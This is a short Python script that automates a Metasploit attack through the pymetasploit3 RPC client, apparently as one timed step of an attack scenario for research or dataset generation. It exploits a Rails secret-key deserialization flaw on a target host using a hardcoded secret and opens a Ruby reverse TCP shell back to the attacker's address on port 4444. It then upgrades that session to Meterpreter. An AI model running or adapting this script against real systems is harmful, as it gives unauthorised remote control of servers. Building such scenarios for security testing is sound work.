import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time):
    output_time_file = os.path.join(folder, output_time)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')
    
    # start step 3
    output_time_file_start = 'time_step_3_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
        payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')

        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 8181
        exploit['TARGETURI'] = '/'
        exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
        payload['LHOST'] = my_ip
        payload['LPORT'] = 4444

        exploit.execute(payload=payload)



        exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
        exploit['SESSION'] = 1
        exploit.execute()

    except Exception as e:
        print(e)
        pass

    time.sleep(30)
    output_time_file_end = 'time_step_3_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)

main(sys.argv)

